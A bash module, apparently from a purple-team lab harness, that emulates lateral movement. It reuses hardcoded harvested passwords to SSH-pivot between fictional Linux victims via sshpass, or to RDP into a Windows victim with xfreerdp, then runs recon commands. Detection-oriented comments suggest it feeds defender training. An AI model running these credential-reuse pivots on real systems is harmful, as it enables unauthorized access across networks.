#!/usr/bin/env bash
# S08 — Lateral movement. Reuses a harvested credential to move host→host.
# Params: VARIANT (odd=SSH pivot Moria→Moria2, even=RDP into Erebor).
# The SSH-pivot variant needs a second Linux victim (VICLIN2). If it isn't
# built yet, this falls back to the RDP variant. See scenarios/S08-lateral-movement.md.
run_scenario() {
  local PW="Autumn2026" WPW='Winter2026!'

  local do_ssh=0
  if (( VARIANT % 2 == 1 )); then
    if [[ "${VICLIN2_IP:-}" =~ ^[0-9] ]] && { [[ "${DRY_RUN:-0}" == "1" ]] || ping -c1 -W2 "$VICLIN2_IP" >/dev/null 2>&1; }; then
      do_ssh=1
    else
      warn "second Linux victim ($VICLIN2_IP) not reachable — using RDP variant instead"
    fi
  fi

  if (( do_ssh == 1 )); then
    step "SSH pivot: land on Moria, then hop to Moria2 with the reused credential"
    # The pivot is initiated FROM Moria (internal→internal is the tell), so run
    # the second hop from inside Moria via the foothold account.
    on_lin_as "$FOOTHOLD_USER" "pivot-ssh" \
      "sshpass -p '$PW' ssh -o StrictHostKeyChecking=no $FOOTHOLD_USER@$VICLIN2_IP 'hostname; whoami; ss -tnp'"
    note "SSH pivot Moria→Moria2 as $FOOTHOLD_USER (internal→internal)"
  else
    step "RDP into Erebor from Barad-dûr with harvested creds"
    run "rdp" "xfreerdp /u:$VICWIN_USER /p:'$WPW' /v:$VICWIN_IP +auth-only /cert:ignore || \
               xfreerdp3 /u:$VICWIN_USER /p:'$WPW' /v:$VICWIN_IP +auth-only /cert:ignore || true"
    note "RDP auth to Erebor as $VICWIN_USER (Logon Type 10 expected)"
    # A brief on-arrival action if OpenSSH is also up, so 'first minute' has content.
    on_win "rdp-onarrival" "powershell -c \"hostname; whoami; Get-NetTCPConnection -State Established | Select -First 5\"" || true
  fi

  noise_lin
}
